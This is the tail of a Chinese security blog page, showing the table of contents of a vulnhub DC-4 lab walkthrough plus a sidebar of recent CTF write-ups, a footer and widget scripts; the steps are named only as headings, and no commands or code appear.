class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#vulnhub%E9%9D%B6%E5%9C%BADC-4%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95"><span class="toc-text">vulnhub靶场DC-4通关记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-text">靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA"><span class="toc-text">渗透靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">一、信息搜集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%AE%BF%E9%97%AEweb%E7%AB%99%E7%82%B9"><span class="toc-text">二、访问web站点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E7%BD%91%E7%AB%99%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81"><span class="toc-text">爆破网站登陆密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">三、反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%BE%E5%88%B0%E5%B9%B6%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81%E6%96%87%E4%BB%B6"><span class="toc-text">找到并提取密码文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E7%99%BB%E9%99%86%E7%94%A8%E6%88%B7"><span class="toc-text">四、登陆用户</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8hydra%E7%88%86%E7%A0%B4jim%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">使用hydra爆破jim用户密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E9%99%86jim%E7%94%A8%E6%88%B7-%E5%8F%91%E7%8E%B0charles%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">登陆jim用户 发现charles用户密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%8F%90%E6%9D%83"><span class="toc-text">五、提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8teehee%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-text">使用teehee进行提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-x2F-etc-x2F-passwd"><span class="toc-text">1.&#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-x2F-etc-x2F-sudoers"><span class="toc-text">2.&#x2F;etc&#x2F;sudoers</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exim4-suid-%E6%8F%90%E6%9D%83"><span class="toc-text">exim4(suid)提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%9F%A5%E6%89%BE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">1.查找漏洞利用脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-text">2.利用脚本</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-text">补充</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/06/11/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F-%E8%A5%BF%E6%9F%9A%E5%96%B5%E5%B8%95%E6%96%AF/" title="第二届黄河流域网络攻防竞赛">第二届黄河流域网络攻防竞赛</a><time datetime="2024-06-11T09:43:23.752Z" title="发表于 2024-06-11 17:43:23">2024-06-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/03/%E7%AC%AC%E4%B8%83%E5%B1%8A%E7%B2%BE%E6%AD%A6%E6%9D%AF-%E8%A5%BF%E6%9F%9A%E7%9A%84%E5%96%B5%E5%B8%95%E6%96%AFWP/" title="第七届精武杯-西柚喵帕斯wp">第七届精武杯-西柚喵帕斯wp</a><time datetime="2024-05-03T14:14:23.575Z" title="发表于 2024-05-03 22:14:23">2024-05-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/" title="2024数信杯北部赛区wp">2024数信杯北部赛区wp</a><time datetime="2024-05-02T13:54:43.678Z" title="发表于 2024-05-02 21:54:43">2024-05-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/29/2024%E6%95%B0%E5%AD%97%E4%B8%AD%E5%9B%BD/" title="2024数字中国">2024数字中国</a><time datetime="2024-04-29T15:07:14.050Z" title="发表于 2024-04-29 23:07:14">2024-04-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/13/vulnhub%E9%9D%B6%E5%9C%BADC-9/" title="vulnhub靶场记录DC-9">vulnhub靶场记录DC-9</a><time datetime="2024-04-13T13:40:27.748Z" title="发表于 2024-04-13 21:40:27">2024-04-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
      avatar: 'monsterid',
      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>